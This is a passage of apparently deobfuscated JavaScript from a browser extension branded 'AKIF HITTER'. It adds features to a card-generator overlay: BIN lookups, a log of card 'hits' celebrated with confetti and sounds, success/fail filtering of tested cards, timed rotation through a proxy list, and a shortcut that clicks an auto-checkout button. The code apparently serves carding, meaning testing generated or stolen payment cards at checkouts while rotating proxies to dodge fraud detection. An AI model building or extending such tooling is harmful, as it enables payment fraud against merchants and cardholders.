            v_1_3.once = true, document.addEventListener("DOMContentLoaded", fn_1_3, v_1_3);
          } else fn_1_3();
        }
        if (fn_5()) {
          fn_2_2();
        } else {
          fn_6(() => {
            fn_2_2();
          });
        }
      }();
    }
  }
  (function v_1_1() {
    if (document.getElementById("akif-top-hitter")) return;
    const v_2_1 = document.createElement("div");
    v_2_1.id = "akif-top-hitter", v_2_1.innerHTML = "\n        <div class=\"akif-hitter-card\">\n            <div class=\"akif-hitter-glow\"></div>\n            <div class=\"akif-hitter-content\">\n                <span class=\"akif-hitter-text\">AKIF TOP</span>\n                <svg class=\"akif-hitter-badge\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                    <rect x=\"4\" y=\"4\" width=\"16\" height=\"16\" rx=\"3\" stroke=\"currentColor\" stroke-width=\"1.5\" fill=\"none\"/>\n                    <circle cx=\"12\" cy=\"12\" r=\"2\" fill=\"currentColor\"/>\n                    <path d=\"M12 8V4M12 20V16\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n                    <path d=\"M8 12H4M20 12H16\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n                </svg>\n            </div>\n        </div>\n    ", document.body.appendChild(v_2_1);
  })();
  if (!document.body) {
    document.addEventListener("DOMContentLoaded", () => {
      if (!document.getElementById("akif-top-hitter")) {
        const v_1_1 = document.createElement("div");
        v_1_1.id = "akif-top-hitter", v_1_1.innerHTML = "\n                <div class=\"akif-hitter-card\">\n                    <div class=\"akif-hitter-glow\"></div>\n                    <div class=\"akif-hitter-content\">\n                        <span class=\"akif-hitter-text\">AKIF HITTER</span>\n                        <svg class=\"akif-hitter-badge\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                            <rect x=\"4\" y=\"4\" width=\"16\" height=\"16\" rx=\"3\" stroke=\"currentColor\" stroke-width=\"1.5\" fill=\"none\"/>\n                            <circle cx=\"12\" cy=\"12\" r=\"2\" fill=\"currentColor\"/>\n                            <path d=\"M12 8V4M12 20V16\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n                            <path d=\"M8 12H4M20 12H16\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n                        </svg>\n                    </div>\n                </div>\n            ", document.body.appendChild(v_1_1);
      }
    });
  }
  (function v_1_1() {
    if (window.__akifEnhancementsLoaded) return;
    window.__akifEnhancementsLoaded = true;
    const fn_1_2 = (p_1, p_2) => (p_2 || document).querySelector(p_1),
      fn_2_1 = (p_1, p_2) => Array.from((p_2 || document).querySelectorAll(p_1)),
      v_2_1 = {
        'get': (p_1, p_2) => {
          try {
            const v_1_2 = localStorage.getItem(p_1);
            return v_1_2 == null ? p_2 : JSON.parse(v_1_2);
          } catch (v_1_2) {
            return p_2;
          }
        },
        'set': (p_1, p_2) => {
          try {
            localStorage.setItem(p_1, JSON.stringify(p_2));
          } catch (v_1_2) {}
        }
      };
    function fn_3_1(p_1, p_2, p_3) {
      const v_1_2 = Date.now();
      (function v_1_3() {
        const v_2_2 = document.querySelector(p_1);
        if (v_2_2) return p_2(v_2_2);
        if (p_3 && Date.now() - v_1_2 > p_3) return;
        setTimeout(v_1_3, 150);
      })();
    }
    function fn_4_1(p_1, p_2, p_3) {
      p_1.style.setProperty("left", p_2 + 'px', "important"), p_1.style.setProperty("top", p_3 + 'px', "important"), p_1.style.setProperty("bottom", "auto", "important"), p_1.style.setProperty("right", "auto", "important");
    }
    function fn_5_1(p_1) {
      const v_1_2 = p_1.querySelector(".panel-header");
      if (!v_1_2 || v_1_2.__akifDragBound) return;
      v_1_2.__akifDragBound = true;
      let v_2_2 = false,
        v_3_2 = 0,
        v_4_2 = 0,
        v_5_2 = 0,
        v_6_2 = 0;
      const v_7_2 = v_2_1.get("akif_overlay_pos");
      if (v_7_2 && typeof v_7_2.left === "number" && typeof v_7_2.top === "number") {
        const v_1_3 = window.innerWidth - 80,
          v_2_3 = window.innerHeight - 80;
        if (v_7_2.left >= 0 && v_7_2.top >= 0 && v_7_2.left <= v_1_3 && v_7_2.top <= v_2_3) fn_4_1(p_1, v_7_2.left, v_7_2.top);else try {
          localStorage.removeItem("akif_overlay_pos");
        } catch (v_1_4) {}
      }
      const fn_1_3 = p_1_1 => {
          if (p_1_1.target.closest("button")) return;
          if (p_1_1.target.closest(".akif-resize-handle")) return;
          const v_1_3 = p_1.getBoundingClientRect();
          v_2_2 = true, v_3_2 = p_1_1.clientX, v_4_2 = p_1_1.clientY, v_5_2 = v_1_3.left, v_6_2 = v_1_3.top, p_1.classList.add("akif-dragging");
          try {
            v_1_2.setPointerCapture && p_1_1.pointerId && v_1_2.setPointerCapture(p_1_1.pointerId);
          } catch (v_1_4) {}
          p_1_1.preventDefault();
        },
        fn_2_2 = p_1_1 => {
          if (!v_2_2) return;
          const v_1_3 = Math.max(0, Math.min(window.innerWidth - 60, v_5_2 + (p_1_1.clientX - v_3_2))),
            v_2_3 = Math.max(0, Math.min(window.innerHeight - 40, v_6_2 + (p_1_1.clientY - v_4_2)));
          fn_4_1(p_1, v_1_3, v_2_3);
        },
        fn_3_2 = () => {
          if (!v_2_2) return;
          v_2_2 = false;
          p_1.classList.remove("akif-dragging");
          const v_1_3 = p_1.getBoundingClientRect(),
            v_2_3 = {};
          v_2_3.left = v_1_3.left, v_2_3.top = v_1_3.top, v_2_1.set("akif_overlay_pos", v_2_3);
        };
      v_1_2.addEventListener("pointerdown", fn_1_3), document.addEventListener("pointermove", fn_2_2), document.addEventListener("pointerup", fn_3_2), document.addEventListener("pointercancel", fn_3_2);
    }
    function fn_6_1(p_1) {
      if (p_1.__akifResizeBound) return;
      p_1.__akifResizeBound = true;
      const v_1_2 = document.createElement("div");
      v_1_2.className = "akif-resize-handle", p_1.appendChild(v_1_2);
      const v_2_2 = v_2_1.get("akif_overlay_size");
      if (v_2_2 && v_2_2.w && v_2_2.h) {
        p_1.style.setProperty("width", v_2_2.w + 'px', "important"), p_1.style.setProperty("max-width", v_2_2.w + 'px', "important"), p_1.style.setProperty("max-height", v_2_2.h + 'px', "important");
      }
      let v_3_2 = false,
        v_4_2 = 0,
        v_5_2 = 0,
        v_6_2 = 0,
        v_7_2 = 0;
      v_1_2.addEventListener("pointerdown", p_1_1 => {
        v_3_2 = true;
        const v_1_3 = p_1.getBoundingClientRect();
        v_4_2 = p_1_1.clientX;
        v_5_2 = p_1_1.clientY;
        v_6_2 = v_1_3.width, v_7_2 = v_1_3.height, p_1_1.preventDefault(), p_1_1.stopPropagation();
      }), document.addEventListener("pointermove", p_1_1 => {
        if (!v_3_2) return;
        const v_1_3 = Math.max(240, Math.min(600, v_6_2 + (p_1_1.clientX - v_4_2))),
          v_2_3 = Math.max(320, Math.min(window.innerHeight - 40, v_7_2 + (p_1_1.clientY - v_5_2)));
        p_1.style.setProperty("width", v_1_3 + 'px', "important"), p_1.style.setProperty("max-width", v_1_3 + 'px', "important"), p_1.style.setProperty("max-height", v_2_3 + 'px', "important");
      });
      const fn_1_3 = () => {
        if (!v_3_2) return;
        v_3_2 = false;
        const v_1_3 = p_1.getBoundingClientRect();
        v_2_1.set("akif_overlay_size", {
          'w': Math.round(v_1_3.width),
          'h': Math.round(v_1_3.height)
        });
      };
      document.addEventListener("pointerup", fn_1_3), document.addEventListener("pointercancel", fn_1_3);
    }
    let v_3_1,
      v_4_1,
      v_5_1 = [];
    function fn_7_1() {
      if (v_3_1) return;
      v_3_1 = document.createElement("canvas"), v_3_1.id = "akif-confetti", document.body.appendChild(v_3_1), v_4_1 = v_3_1.getContext('2d');
      const fn_1_3 = () => {
        v_3_1.width = window.innerWidth;
        v_3_1.height = window.innerHeight;
      };
      fn_1_3();
      window.addEventListener("resize", fn_1_3), requestAnimationFrame(fn_9_1);
    }
    function fn_8_1() {
      fn_7_1();
      const v_1_2 = ["#60a5fa", "#2563eb", "#3b82f6", "#93c5fd", "#ffffff", "#60a5fa"],
        v_2_2 = window.innerWidth / 2,
        v_3_2 = window.innerHeight / 2;
      for (let v_1_3 = 0; v_1_3 < 140; v_1_3++) {
        const v_1_4 = Math.random() * Math.PI * 2,
          v_2_3 = 4 + Math.random() * 9;
        v_5_1.push({
          'x': v_2_2,
          'y': v_3_2,
          'vx': Math.cos(v_1_4) * v_2_3,
          'vy': Math.sin(v_1_4) * v_2_3 - 3,
          'g': 0.18 + Math.random() * 0.1,
          'life': 90 + Math.random() * 60,
          'age': 0x0,
          'size': 4 + Math.random() * 6,
          'color': v_1_2[Math.floor(Math.random() * v_1_2.length)],
          'rot': Math.random() * Math.PI * 2,
          'vr': (Math.random() - 0.5) * 0.3
        });
      }
    }
    function fn_9_1() {
      if (!v_4_1) return;
      v_4_1.clearRect(0, 0, v_3_1.width, v_3_1.height);
      for (let v_1_2 = v_5_1.length - 1; v_1_2 >= 0; v_1_2--) {
        const v_1_3 = v_5_1[v_1_2];
        v_1_3.age++, v_1_3.vy += v_1_3.g, v_1_3.x += v_1_3.vx, v_1_3.y += v_1_3.vy, v_1_3.rot += v_1_3.vr;
        const v_2_2 = Math.max(0, 1 - v_1_3.age / v_1_3.life);
        v_4_1.save(), v_4_1.globalAlpha = v_2_2, v_4_1.translate(v_1_3.x, v_1_3.y), v_4_1.rotate(v_1_3.rot), v_4_1.fillStyle = v_1_3.color, v_4_1.fillRect(-v_1_3.size / 2, -v_1_3.size / 2, v_1_3.size, v_1_3.size * 0.4), v_4_1.restore();
        if (v_1_3.age >= v_1_3.life || v_1_3.y > v_3_1.height + 50) v_5_1.splice(v_1_2, 1);
      }
      requestAnimationFrame(fn_9_1);
    }
    let v_6_1;
    function fn_10() {
      if (!v_6_1) try {
        v_6_1 = new (window.AudioContext || window.webkitAudioContext)();
      } catch (v_1_2) {}
      return v_6_1;
    }
    function fn_11(p_1, p_2, p_3) {
      const v_1_2 = fn_10();
      if (!v_1_2) return;
      const v_2_2 = v_1_2.currentTime;
      p_1.forEach((p_1_1, p_2_1) => {
        const v_1_3 = v_1_2.createOscillator(),
          v_2_3 = v_1_2.createGain();
        v_1_3.type = p_3 || "sine", v_1_3.frequency.setValueAtTime(p_1_1, v_2_2 + p_2_1 * 0.08);
        v_2_3.gain.setValueAtTime(0.0001, v_2_2 + p_2_1 * 0.08), v_2_3.gain.exponentialRampToValueAtTime(0.22, v_2_2 + p_2_1 * 0.08 + 0.02), v_2_3.gain.exponentialRampToValueAtTime(0.0001, v_2_2 + p_2_1 * 0.08 + p_2 / 1000);
        v_1_3.connect(v_2_3).connect(v_1_2.destination), v_1_3.start(v_2_2 + p_2_1 * 0.08), v_1_3.stop(v_2_2 + p_2_1 * 0.08 + p_2 / 1000 + 0.02);
      });
    }
    const v_7_1 = {};
    v_7_1.hit = [660, 880, 1320], v_7_1.fail = [220, 160];
    const v_8_1 = {};
    v_8_1.hit = [523, 659, 784, 1047], v_8_1.fail = [200, 150, 110];
    const v_9_1 = {};
    v_9_1.hit = [1047, 1319], v_9_1.fail = [392, 330];
    const v_10_1 = {};
    v_10_1.hit = [330, 494, 659], v_10_1.fail = [110, 82];
    const v_11_1 = {};
    v_11_1.hit = [], v_11_1.fail = [];
    const v_12 = {};
    v_12.classic = v_7_1, v_12.arcade = v_8_1;
    v_12.chime = v_9_1, v_12.deep = v_10_1;
    v_12.silent = v_11_1;
    const v_13 = v_12;
    function fn_12(p_1) {
      const v_1_2 = v_2_1.get("akif_sound_pack", "classic") || "classic",
        v_2_2 = v_13[v_1_2] || v_13.classic,
        v_3_2 = v_2_2[p_1] || [];
      if (v_3_2.length) fn_11(v_3_2, p_1 === "hit" ? 260 : 220, p_1 === "hit" ? "triangle" : "square");
    }
    function fn_13() {
      const v_1_2 = v_2_1.get("akif_hit_log", []);
      const v_2_2 = Date.now();
      const v_3_2 = 86400000,
        v_4_2 = v_1_2.filter(p_1 => v_2_2 - p_1.t < v_3_2).length,
        v_5_2 = v_1_2.filter(p_1 => v_2_2 - p_1.t < 7 * v_3_2).length,
        v_6_2 = {};
      v_6_2.total = v_1_2.length;
      return v_6_2.today = v_4_2, v_6_2.week = v_5_2, v_6_2;
    }
    function fn_14(p_1) {
      const v_1_2 = v_2_1.get("akif_hit_log", []);
      v_1_2.unshift({
        't': Date.now(),
        'card': p_1 && p_1.card
      });
      if (v_1_2.length > 500) v_1_2.length = 500;
      v_2_1.set("akif_hit_log", v_1_2);
    }
    function fn_15() {
      const v_1_2 = fn_1_2("#akif-stats-host");
      if (!v_1_2) return;
      const v_2_2 = fn_13();
      v_1_2.innerHTML = "<div class=\"akif-stats-card\"><div class=\"akif-stats-value\">" + v_2_2.total + "</div><div class=\"akif-stats-label\">Total</div></div>" + "<div class=\"akif-stats-card\"><div class=\"akif-stats-value\">" + v_2_2.today + "</div><div class=\"akif-stats-label\">Today</div></div>" + "<div class=\"akif-stats-card\"><div class=\"akif-stats-value\">" + v_2_2.week + "</div><div class=\"akif-stats-label\">7d</div></div>";
    }
    function fn_16(p_1) {
      const v_1_2 = p_1.querySelector("#binSection");
      if (!v_1_2 || v_1_2.querySelector("#akif-stats-host")) return;
      const v_2_2 = document.createElement("div");
      v_2_2.id = "akif-stats-host", v_2_2.className = "akif-stats", v_1_2.insertBefore(v_2_2, v_1_2.firstChild), fn_15();
    }
    const v_14 = {};
    async function fn_17(p_1) {
      if (!/^\d{6,8}$/.test(p_1)) return null;
      if (v_14[p_1]) return v_14[p_1];
      try {
        const v_1_2 = await fetch("https://lookup.binlist.net/" + p_1.slice(0, 6));
        if (!v_1_2.ok) return null;
        const v_2_2 = await v_1_2.json();
        return v_14[p_1] = v_2_2, v_2_2;
      } catch (v_1_2) {
        return null;
      }
    }
    function fn_18(p_1) {
      const v_1_2 = p_1.querySelector("#newBinInput");
      if (!v_1_2 || v_1_2.__akifBinBound) return;
      v_1_2.__akifBinBound = true;
      const v_2_2 = document.createElement("div");
      v_2_2.className = "akif-bin-info", v_2_2.id = "akifBinInfo", v_1_2.parentNode.parentNode.insertBefore(v_2_2, v_1_2.parentNode.nextSibling);
      let v_3_2 = null;
      v_1_2.addEventListener("input", () => {
        clearTimeout(v_3_2);
        const v_1_3 = (v_1_2.value || '').replace(/\D/g, '').slice(0, 8);
        if (v_1_3.length < 6) {
          v_2_2.classList.remove("show");
          return;
        }
        v_3_2 = setTimeout(async () => {
          const v_1_4 = await fn_17(v_1_3);
          if (!v_1_4) {
            v_2_2.classList.remove("show");
            return;
          }
          const v_2_3 = (v_1_4.scheme || '-').toUpperCase();
          const v_3_3 = (v_1_4.type || '-').toUpperCase();
          const v_4_2 = v_1_4.brand || '-',
            v_5_2 = v_1_4.bank && v_1_4.bank.name || '-',
            v_6_2 = v_1_4.country && v_1_4.country.emoji + '\x20' + v_1_4.country.name || '-';
          v_2_2.innerHTML = "<div class=\"row\"><span>Scheme</span><span>" + v_2_3 + "</span></div>" + "<div class=\"row\"><span>Type</span><span>" + v_3_3 + "</span></div>" + "<div class=\"row\"><span>Brand</span><span>" + v_4_2 + "</span></div>" + "<div class=\"row\"><span>Bank</span><span>" + v_5_2 + "</span></div>" + "<div class=\"row\"><span>Country</span><span>" + v_6_2 + "</span></div>";
          v_2_2.classList.add("show");
        }, 450);
      });
    }
    function fn_19(p_1) {
      const v_1_2 = p_1.querySelector("#settingsContent");
      if (!v_1_2 || v_1_2.querySelector(".akif-io-row")) return;
      const v_2_2 = document.createElement("div");
      v_2_2.className = "akif-io-row", v_2_2.innerHTML = "<button class=\"action-btn save-btn\" id=\"akifExportBtn\"><i class=\"fas fa-file-export\"></i> EXPORT</button>" + "<button class=\"action-btn switch-btn\" id=\"akifImportBtn\"><i class=\"fas fa-file-import\"></i> IMPORT</button>", v_1_2.appendChild(v_2_2), v_2_2.querySelector("#akifExportBtn").addEventListener("click", () => {
        const v_1_3 = {};
        Object.keys(localStorage).filter(p_1_1 => p_1_1.startsWith("akif_")).forEach(p_1_1 => {
          v_1_3[p_1_1] = localStorage.getItem(p_1_1);
        });
        const v_2_3 = new Blob([JSON.stringify(v_1_3, null, 2)], {
            'type': "application/json"
          }),
          v_3_2 = URL.createObjectURL(v_2_3),
          v_4_2 = document.createElement('a');
        v_4_2.href = v_3_2, v_4_2.download = "akif-backup-" + Date.now() + ".json", v_4_2.click(), setTimeout(() => URL.revokeObjectURL(v_3_2), 2000);
      }), v_2_2.querySelector("#akifImportBtn").addEventListener("click", () => {
        const v_1_3 = document.createElement("input");
        v_1_3.type = "file";
        v_1_3.accept = "application/json", v_1_3.addEventListener("change", () => {
          const v_1_4 = v_1_3.files && v_1_3.files[0];
          if (!v_1_4) return;
          const v_2_3 = new FileReader();
          v_2_3.onload = () => {
            try {
              const v_1_5 = JSON.parse(v_2_3.result);
              Object.keys(v_1_5).filter(p_1_1 => p_1_1.startsWith("akif_")).forEach(p_1_1 => localStorage.setItem(p_1_1, v_1_5[p_1_1])), setTimeout(() => location.reload(), 400);
            } catch (v_1_5) {}
          }, v_2_3.readAsText(v_1_4);
        });
        v_1_3.click();
      });
    }
    function fn_20(p_1) {
      const v_1_2 = p_1.querySelector("#settingsContent .settings-grid") || p_1.querySelector("#settingsContent");
      if (!v_1_2 || v_1_2.querySelector("#akifSoundPack")) return;
      const v_2_2 = document.createElement("div");
      v_2_2.className = "setting-row", v_2_2.innerHTML = "<svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\"><path d=\"M3 10V14H7L12 19V5L7 10H3Z\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/></svg>" + "<span class=\"setting-label\">Sound</span>" + "<select class=\"akif-select\" id=\"akifSoundPack\">" + "<option value=\"classic\">Classic</option>" + "<option value=\"arcade\">Arcade</option>" + "<option value=\"chime\">Chime</option>" + "<option value=\"deep\">Deep</option>" + "<option value=\"silent\">Silent</option>" + "</select>", v_1_2.appendChild(v_2_2);
      const v_3_2 = v_2_2.querySelector("#akifSoundPack");
      v_3_2.value = v_2_1.get("akif_sound_pack", "classic"), v_3_2.addEventListener("change", () => {
        v_2_1.set("akif_sound_pack", v_3_2.value), fn_12("hit");
      });
      const v_4_2 = document.createElement("div");
      v_4_2.className = "setting-row";
      v_4_2.innerHTML = "<svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\"><path d=\"M23 4V10H17\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><path d=\"M20.49 15A9 9 0 1 1 19 7.07\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg><span class=\"setting-label\">Auto-Rotate</span>" + "<input type=\"number\" class=\"setting-text-input\" id=\"akifRotateSec\" style=\"width:50px\" min=\"5\" max=\"600\" value=\"" + v_2_1.get("akif_rotate_sec", 30) + '\x22>' + "<div class=\"akif-toggle\" id=\"akifRotateToggle\"></div>", v_1_2.appendChild(v_4_2);
      const v_5_2 = v_4_2.querySelector("#akifRotateToggle"),
        v_6_2 = v_4_2.querySelector("#akifRotateSec");
      if (v_2_1.get("akif_rotate_on", false)) v_5_2.classList.add('on');
      v_5_2.addEventListener("click", () => {
        v_5_2.classList.toggle('on');
        v_2_1.set("akif_rotate_on", v_5_2.classList.contains('on'));
        fn_21();
      }), v_6_2.addEventListener("change", () => {
        const v_1_3 = Math.max(5, Math.min(600, parseInt(v_6_2.value) || 30));
        v_6_2.value = v_1_3, v_2_1.set("akif_rotate_sec", v_1_3), fn_21();
      });
    }
    let v_15 = null;
    function fn_21() {
      v_15 && (clearInterval(v_15), v_15 = null);
      if (!v_2_1.get("akif_rotate_on", false)) return;
      const v_1_2 = Math.max(5, v_2_1.get("akif_rotate_sec", 30));
      v_15 = setInterval(() => {
        const v_1_3 = v_2_1.get("akif_proxy_list", []);
        if (!v_1_3 || !v_1_3.length) return;
        const v_2_2 = v_1_3.map((p_1, p_2) => ({
          'p': p_1,
          'i': p_2
        })).filter(p_1 => p_1.p && p_1.p.status !== "dead");
        if (!v_2_2.length) return;
        const v_3_2 = parseInt(localStorage.getItem("akif_active_proxy_index") || '-1', 10);
        let v_4_2 = v_2_2[0];
        for (let v_1_4 = 0; v_1_4 < v_2_2.length; v_1_4++) {
          if (v_2_2[v_1_4].i > v_3_2) {
            v_4_2 = v_2_2[v_1_4];
            break;
          }
        }
        localStorage.setItem("akif_active_proxy_index", v_4_2.i), window.postMessage({
          'type': "AKIF_SET_ACTIVE_PROXY_FROM_PAGE",
          'requestId': "rotate_" + Date.now(),
          'proxy': v_4_2.p.proxy
        }, '*');
      }, v_1_2 * 1000);
    }
    function fn_22(p_1) {
      const v_1_2 = p_1.querySelector("#proxySection");
      if (!v_1_2 || v_1_2.querySelector("#akifSpeedTestAllBtn")) return;
      const v_2_2 = document.createElement("button");
      v_2_2.id = "akifSpeedTestAllBtn", v_2_2.className = "action-btn bulk-add-btn", v_2_2.style.cssText = "margin:6px auto 0;display:flex;", v_2_2.innerHTML = "<i class=\"fas fa-bolt\"></i> SPEED TEST ALL";
      const v_3_2 = v_1_2.querySelector("#proxyListContainer");
      if (v_3_2) v_3_2.parentNode.insertBefore(v_2_2, v_3_2.nextSibling);
      v_2_2.addEventListener("click", async () => {
        v_2_2.disabled = true, v_2_2.textContent = "Testing...";
        const v_1_3 = fn_2_1(".proxy-list-item", v_1_2);
        for (const v_1_4 of v_1_3) {
          const v_1_5 = document.createElement("span");
          v_1_5.className = "akif-proxy-ping testing", v_1_5.textContent = "...";
          const v_2_3 = v_1_4.querySelector(".akif-proxy-ping");
          if (v_2_3) v_2_3.remove();
          (v_1_4.querySelector(".proxy-list-main") || v_1_4).appendChild(v_1_5);
          const v_3_3 = performance.now();
          try {
            const v_1_6 = new AbortController(),
              v_2_4 = setTimeout(() => v_1_6.abort(), 4500);
            await fetch("https://www.google.com/generate_204", {
              'signal': v_1_6.signal,
              'mode': "no-cors",
              'cache': "no-store"
            }), clearTimeout(v_2_4);
            const v_3_4 = Math.round(performance.now() - v_3_3);
            v_1_5.className = "akif-proxy-ping " + (v_3_4 < 400 ? "fast" : v_3_4 < 1200 ? "mid" : "slow"), v_1_5.textContent = v_3_4 + 'ms';
          } catch (v_1_6) {
            v_1_5.className = "akif-proxy-ping dead", v_1_5.textContent = "DEAD";
          }
        }
        v_2_2.disabled = false, v_2_2.innerHTML = "<i class=\"fas fa-bolt\"></i> SPEED TEST ALL";
      });
    }
    function fn_23(p_1) {
      const v_1_2 = p_1.querySelector("#statsContent");
      if (!v_1_2 || v_1_2.querySelector(".akif-history-search")) return;
      const v_2_2 = v_1_2.querySelector("#historyList");
      if (!v_2_2) return;
      const v_3_2 = document.createElement("input");
      v_3_2.className = "akif-history-search", v_3_2.placeholder = "Search card...";
      const v_4_2 = document.createElement("div");
      v_4_2.className = "akif-history-filters";
      v_4_2.innerHTML = "<button class=\"akif-filter-chip active\" data-f=\"all\">ALL</button>" + "<button class=\"akif-filter-chip\" data-f=\"success\">SUCCESS</button>" + "<button class=\"akif-filter-chip\" data-f=\"error\">FAIL</button>" + "<button class=\"akif-filter-chip akif-clear-chip\" data-clear=\"history\" title=\"Clear logs\"><i class=\"fas fa-trash\"></i></button>", v_1_2.insertBefore(v_4_2, v_2_2), v_1_2.insertBefore(v_3_2, v_4_2);
      const v_5_2 = v_1_2.querySelector("#clearHistory");
      if (v_5_2) v_5_2.style.display = "none";
      v_4_2.querySelector(".akif-clear-chip").addEventListener("click", p_1_1 => {
        p_1_1.stopPropagation();
        const v_1_3 = document.getElementById("clearHistory");
        if (v_1_3) v_1_3.click();
      });
      let v_6_2 = "all";
      function fn_1_3() {
        const v_1_3 = (v_3_2.value || '').toLowerCase(),
          v_2_3 = v_6_2 !== "all" || v_1_3.length > 0;
        fn_2_1(".history-item", v_2_2).forEach(p_1_1 => {
          p_1_1.style.removeProperty("display"), p_1_1.style.removeProperty("opacity"), p_1_1.style.removeProperty("visibility");
          if (!v_2_3) return;
          const v_1_4 = p_1_1.classList.contains("success"),
            v_2_4 = (p_1_1.textContent || '').toLowerCase();
          const v_3_3 = v_6_2 === "all" ? true : v_6_2 === "success" ? v_1_4 : !v_1_4,
            v_4_3 = !v_1_3 || v_2_4.indexOf(v_1_3) !== -1;
          if (!(v_3_3 && v_4_3)) p_1_1.style.display = "none";
        });
      }
      v_3_2.addEventListener("input", fn_1_3), v_4_2.querySelectorAll(".akif-filter-chip").forEach(p_1_1 => {
        p_1_1.addEventListener("click", () => {
          v_4_2.querySelectorAll(".akif-filter-chip").forEach(p_1_2 => p_1_2.classList.remove("active")), p_1_1.classList.add("active"), v_6_2 = p_1_1.getAttribute("data-f"), fn_1_3();
        });
      });
      const v_7_2 = {};
      v_7_2.childList = true;
      v_7_2.subtree = true;
      new MutationObserver(fn_1_3).observe(v_2_2, v_7_2);
    }
    function fn_24() {
      if (window.__akifKbdBound) return;
      window.__akifKbdBound = true, document.addEventListener("keydown", p_1 => {
        const v_1_2 = p_1.ctrlKey || p_1.metaKey;
        if (v_1_2 && p_1.shiftKey && (p_1.key === 'A' || p_1.key === 'a')) {
          p_1.preventDefault();
          const v_1_3 = fn_1_2(".card-generator-overlay"),
            v_2_2 = fn_1_2("#akif-top-hitter");
          if (v_1_3) v_1_3.classList.toggle("overlay-hidden");
          if (v_2_2) v_2_2.style.display = v_2_2.style.display === "none" ? '' : "none";
        }
        if (v_1_2 && p_1.key === "Enter") {
          const v_1_3 = fn_1_2("#autocoBtn");
          v_1_3 && (p_1.preventDefault(), v_1_3.click());
        }
        if (p_1.key === "Escape") {
          const v_1_3 = fn_1_2(".cc-modal:not(.hidden)");
          if (v_1_3) {
            const v_1_4 = v_1_3.querySelector(".cc-modal-close");
            if (v_1_4) v_1_4.click();
          }
        }
      });
    }
    window.addEventListener("akif:hit", p_1 => {
      fn_8_1();
      fn_12("hit");
      fn_14(p_1.detail);
      fn_15();
    });
    window.addEventListener("akif:history", () => {
      fn_15();
    });
    const v_16 = {};
    v_16.passive = true, document.addEventListener("mousemove", p_1 => {
      const v_1_2 = p_1.target;
      if (v_1_2 && v_1_2.closest && v_1_2.closest(".action-btn")) {
        const v_1_3 = v_1_2.closest(".action-btn"),
          v_2_2 = v_1_3.getBoundingClientRect();
        v_1_3.style.setProperty("--mx", p_1.clientX - v_2_2.left + 'px'), v_1_3.style.setProperty("--my", p_1.clientY - v_2_2.top + 'px');
      }
    }, v_16);
    function fn_25(p_1) {
      if (p_1.__akifScrollWrapped) return;
      const v_1_2 = p_1.querySelector(".panel-header");
      if (!v_1_2) return;
      if (p_1.querySelector(":scope > .akif-scroll")) {
        p_1.__akifScrollWrapped = true;
        return;
      }
      const v_2_2 = document.createElement("div");
      v_2_2.className = "akif-scroll";
      const v_3_2 = p_1.querySelector(":scope > .akif-resize-handle");
      const v_4_2 = [];
      let v_5_2 = v_1_2.nextSibling;
      while (v_5_2) {
        const v_1_3 = v_5_2.nextSibling;
        if (v_5_2 !== v_3_2) v_4_2.push(v_5_2);
        v_5_2 = v_1_3;
      }
      v_4_2.forEach(p_1_1 => v_2_2.appendChild(p_1_1)), v_1_2.after(v_2_2), p_1.__akifScrollWrapped = true;
    }
    function fn_26(p_1) {
      if (p_1.__akifReorg) return;
      const v_1_2 = p_1.querySelector("#proxyLogsSection");
      const v_2_2 = p_1.querySelector("#statsToggle");
      if (!v_1_2 || !v_2_2) return;
      const v_3_2 = v_2_2.closest(".collapsible-section");
      if (!v_3_2) return;
      v_1_2.classList.add("collapsible-section");
      const v_4_2 = v_1_2.previousElementSibling;
      if (v_4_2 && v_4_2.classList.contains("section-divider")) v_4_2.remove();
      v_3_2.parentNode.insertBefore(v_1_2, v_3_2), p_1.__akifReorg = true;
    }
    function fn_27(p_1) {
      const v_1_2 = p_1.querySelector("#proxyLogsContent");
      if (!v_1_2 || v_1_2.querySelector(".akif-proxy-clear-top")) return;
      const v_2_2 = v_1_2.querySelector("#clearProxyLogsBtn"),
        v_3_2 = v_1_2.querySelector("#proxyLogsList");
      if (!v_3_2) return;
      const v_4_2 = document.createElement("div");
      v_4_2.className = "akif-proxy-clear-top";
      v_4_2.innerHTML = "<button class=\"akif-filter-chip akif-clear-chip\" title=\"Clear proxy logs\"><i class=\"fas fa-trash\"></i> CLEAR LOGS</button>", v_1_2.insertBefore(v_4_2, v_3_2);
      if (v_2_2) v_2_2.style.display = "none";
      v_4_2.querySelector(".akif-clear-chip").addEventListener("click", p_1_1 => {
        p_1_1.stopPropagation();
        const v_1_3 = document.getElementById("clearProxyLogsBtn");
        if (v_1_3) v_1_3.click();
      });
    }
    function fn_28(p_1, p_2) {
      const v_1_2 = document.getElementById(p_1),
        v_2_2 = document.getElementById(p_2);
      if (!v_1_2 || !v_2_2) return;
      const v_3_2 = v_1_2.cloneNode(true);
      v_1_2.parentNode.replaceChild(v_3_2, v_1_2);
      v_3_2.addEventListener("click", p_1_1 => {
        p_1_1.preventDefault();
        p_1_1.stopPropagation();
        const v_1_3 = v_3_2.querySelector(".collapse-icon"),
          v_2_3 = v_2_2.classList.contains("open") || v_2_2.style.display === "block";
        if (v_2_3) {
          v_2_2.classList.remove("open"), v_2_2.style.display = "none";
          if (v_1_3) v_1_3.classList.remove("icon-rotated");
        } else {
          v_2_2.classList.add("open"), v_2_2.style.display = "block";
          if (v_1_3) v_1_3.classList.add("icon-rotated");
        }
      });
    }
    function fn_29() {
      fn_28("proxyLogsToggle", "proxyLogsContent");
      fn_28("statsToggle", "statsContent");
      fn_28("settingsToggle", "settingsContent");
    }
    function fn_30(p_1) {
      try {
        fn_25(p_1);
      } catch (v_1_2) {}
      try {
        fn_5_1(p_1);
      } catch (v_1_2) {}
      try {
